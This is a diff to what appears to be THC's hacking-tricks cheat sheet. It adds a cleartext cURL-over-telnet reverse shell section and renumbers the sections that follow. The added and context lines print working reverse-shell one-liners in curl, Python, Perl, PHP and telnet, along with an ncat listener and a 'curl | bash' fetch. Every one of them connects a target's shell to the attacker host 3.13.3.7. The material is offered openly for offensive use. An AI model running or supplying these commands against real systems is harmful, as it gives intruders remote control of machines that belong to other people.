@@ -52,6 +52,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [with gs-netcat (encrypted)](#reverse-shell-gs-netcat)
       1. [with Bash](#reverse-shell-bash)
       2. [with cURL (encrypted)](#curlshell)
+      2. [with cURL (cleartext)](#curltelnet)
       3. [with OpenSSL (encrypted)](#sslshell)
       1. [with remote.moe (encrypted)](#revese-shell-remote-moe)
       1. [without /dev/tcp](#reverse-shell-no-bash)
@@ -1129,8 +1130,20 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3
 curl -skfL https://3.13.3.7:8080 | bash
 ```
 
+<a id="curltelnet"></a>
+**5.i.d Reverse shell with cURL (cleartext)**
+
+Start ncat to listen for multiple connections:
+```sh
+ncat -kl 1524
+```
+```sh
+# On the target:
+C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+```
+
 <a id="sslshell"></a>
-**5.i.d. Reverse shell with OpenSSL (encrypted)**
+**5.i.e. Reverse shell with OpenSSL (encrypted)**
 
 ```sh
 # Generate SSL keys:
@@ -1144,7 +1157,7 @@ openssl s_server -port 1524 -cert cert.pem -key key.pem
 ```
 
 <a id="reverse-shell-no-bash"></a>
-**5.i.e. Reverse shell without /dev/tcp**
+**5.i.f. Reverse shell without /dev/tcp**
 
 Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
@@ -1179,7 +1192,7 @@ tail -f /tmp/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/tmp/.fio
 Note: This trick logs your commands to a file. The file will be *unlinked* from the after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
 <a id="revese-shell-remote-moe"></a>
-**5.i.f. Reverse shell with remote.moe and ssh (encrypted)**
+**5.i.g. Reverse shell with remote.moe and ssh (encrypted)**
 
 It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
 
@@ -1206,13 +1219,13 @@ rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p &
 ```
 
 <a id="reverse-shell-python"></a>
-**5.i.g. Reverse shell with Python**
+**5.i.h. Reverse shell with Python**
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 <a id="reverse-shell-perl"></a>
-**5.i.h. Reverse shell with Perl**
+**5.i.i. Reverse shell with Perl**
 
 ```sh
 # method 1
@@ -1221,7 +1234,7 @@ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotob
 perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 <a id="reverse-shell-php"></a>
-**5.i.i. Reverse shell with PHP**
+**5.i.j. Reverse shell with PHP**
 
 ```sh
 php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
